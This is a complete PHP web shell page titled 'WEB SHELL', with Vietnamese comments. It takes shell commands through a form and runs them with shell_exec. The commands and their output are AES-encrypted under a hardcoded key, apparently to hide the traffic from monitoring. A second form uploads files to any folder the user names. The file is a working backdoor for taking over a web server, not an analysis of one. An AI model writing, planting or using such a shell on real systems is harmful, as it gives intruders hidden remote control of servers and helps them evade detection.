<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <title>WEB SHELL</title>
</head>

<body>
    <?php
    error_reporting(E_ERROR | E_PARSE);
    // Khóa và IV (Initialization Vector)
    $key = "ViewViewViewViewViewViewViewView";
    $iv = "16byteivforaes";
    function encryptAES($data, $key, $iv)
    {
        $cipher = "AES-256-CBC";
        $options = OPENSSL_RAW_DATA;
        $encrypted = openssl_encrypt($data, $cipher, $key, $options, $iv);
        $encrypted = bin2hex($encrypted);
        return $encrypted;
    }

    function decryptAES($encryptedData, $key, $iv)
    {
        $cipher = "AES-256-CBC";
        $options = OPENSSL_RAW_DATA;
        $decrypted = openssl_decrypt(hex2bin($encryptedData), $cipher, $key, $options, $iv);
        return $decrypted;
    }

    //#########################################################################

    #UPLOAD FILE TO RANDOM DIR
    if ($_GET['option']) {
        echo "<form action='/private.php' method='post' style='margin:50px' id='myForm' enctype='multipart/form-data'>
        <label for='folder' >Upload to folder</label>
        <input type='text' name='folder' required>
        <br>
        <input type='file' name='uploadFile' id='uploadFile' required>
        <button type='submit'>Upload</button>
    </form>";
    }
    #COMMAND EXECUTE
    else {
        echo "    <div style='margin:50px'>
        <form action='/private.php' method='POST' id='my-form'>
            <label for='input'><h2>Input command to execute</h2></label><br>
            <input type='text' name='command' id='input' style='width:270px;height:25px'>
            &nbsp;
            <button type='submit' style='width:100px;height:30px; background-color: #fae4a7'>EXECUTE</button>
        </form>
    </div>";
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if($_POST['command']){
                $encryptedCommand = $_POST['command'];
                $decryptedCommand = decryptAES($encryptedCommand, $key, $iv);
                $result = shell_exec($decryptedCommand);
                $encryptedResult = encryptAES($result, $key, $iv);
                echo "<p id='test'>" . $encryptedResult . "</p>";
            }
            if($_FILES['uploadFile'] && $_POST['folder'] ){
                $targetDir = $_POST['folder'];
                $targetFile = $targetDir . basename($_FILES["uploadFile"]["name"]);
                move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $targetFile);
            }
        }
    }
    ?>
    <p id='result' style="margin-left:50px"></p>
    <script>
        function encrypt(plaintext) {
            var key = CryptoJS.enc.Utf8.parse("ViewViewViewViewViewViewViewView");
            var iv = CryptoJS.enc.Utf8.parse("16byteivforaes");
            var encrypted = CryptoJS.AES.encrypt(plaintext, key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7,
                keySize: 256 / 32
            });

            var ciphertext = encrypted.ciphertext.toString();
            return ciphertext;
        }

        document.getElementById('my-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Ngăn chặn hành động mặc định của form
            var form = document.getElementById('my-form');
            var newData = encrypt(document.getElementById('my-form').elements['command'].value)
            document.getElementById('my-form').elements['command'].value = newData;
            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        var response = xhr.responseText;
                        // Xử lý dữ liệu trả về tại đây
                        // response =decryptAES(response)
                        locationOfRealData = response.indexOf("<p id='test'>");
                        locationOfRealData2 = response.indexOf("</p>", locationOfRealData);
                        res = response.substring(locationOfRealData + 13, locationOfRealData2)
                        res = decryptAES(res)
                        document.getElementById('result').innerHTML = res;
                    } else {
                        // Xử lý lỗi (nếu có) tại đây
                        console.error(xhr.status);
                    }
                }
            };

            xhr.open('POST', form.action, true);
            xhr.send(formData);
        });


        function decryptAES(ciphertext, key = "ViewViewViewViewViewViewViewView", iv = "16byteivforaes") {
            // Chuyển đổi key và iv thành đối tượng WordArray
            var keyBytes = CryptoJS.enc.Utf8.parse(key);
            var ivBytes = CryptoJS.enc.Utf8.parse(iv);

            // Giải mã dữ liệu
            var decrypted = CryptoJS.AES.decrypt({
                    ciphertext: CryptoJS.enc.Hex.parse(ciphertext)
                },
                keyBytes, {
                    iv: ivBytes,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                }
            );

            // Chuyển đổi dữ liệu nguyên thủy (WordArray) thành chuỗi UTF-8
            var plaintext = decrypted.toString(CryptoJS.enc.Utf8);
            return plaintext;
        }
    </script>
</body>

</html>